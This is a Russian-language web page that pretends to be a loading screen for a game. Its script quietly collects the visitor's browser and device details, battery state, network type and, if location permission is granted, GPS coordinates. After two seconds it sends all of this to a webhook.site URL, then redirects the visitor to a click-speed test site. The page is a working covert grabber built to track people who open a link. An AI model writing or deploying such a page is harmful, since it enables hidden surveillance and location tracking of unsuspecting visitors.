<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Загрузка...</title>
<style>
  body{font-family:system-ui,sans-serif;background:#0d0d0d;color:#eee;
       display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden}
  .box{text-align:center}
  .spin{width:50px;height:50px;border:4px solid #333;border-top-color:#2a6;
        border-radius:50%;animation:s 1s linear infinite;margin:0 auto 20px}
  @keyframes s{to{transform:rotate(360deg)}}
  p{opacity:.8;font-size:16px}
</style>
</head>
<body>
<div class="box">
  <div class="spin"></div>
  <p id="msg">Загрузка данных...</p>
</div>

<script>
const HOOK = "https://webhook.site/9f5d0c93-5cdc-4243-b020-361ff9394b9c";
let data = {
  event: "advanced_visit",
  ts: new Date().toISOString(),
  page: location.href,
  ua: navigator.userAgent,
  platform: navigator.platform,
  lang: navigator.language,
  screen: screen.width + "x" + screen.height,
  tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
  ip: "Смотри в заголовках",
  gps: "нет доступа / не запрошено",
  battery: "неизвестно",
  connection: "неизвестно",
  touch: navigator.maxTouchPoints
};

// 1. Сбор батареи и сети
if (navigator.getBattery) {
  navigator.getBattery().then(b => {
    data.battery = Math.round(b.level * 100) + "% " + (b.charging ? "(заряжается)" : "(разряжается)");
  });
}
if (navigator.connection) {
  data.connection = navigator.connection.effectiveType || "unknown";
}

// 2. Сбор GPS (сработает только если разрешат)
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(
    pos => {
      data.gps = pos.coords.latitude + ", " + pos.coords.longitude;
    },
    err => {
      data.gps = "Отказано в доступе";
    },
    { timeout: 5000 }
  );
}

// 3. Отправка на webhook
function send() {
  fetch(HOOK, {
    method: "POST",
    mode: "no-cors",
    headers: {"Content-Type": "text/plain"},
    body: JSON.stringify(data)
  }).catch(e => {});
}

// Ждем 2 секунды, чтобы GPS и батарея успели считаться
setTimeout(() => {
  send();
  // редирект на игру
  setTimeout(() => { location.href = "https://clickspeedtest.com/"; }, 1000);
}, 2000);

// Анимация
let msg = document.getElementById("msg");
let steps = ["Загрузка данных...", "Подключение к серверу...", "Запуск..."];
let i = 0;
setInterval(() => { i++; if (i < steps.length) msg.textContent = steps[i]; }, 1000);
</script>
</body>
</html>
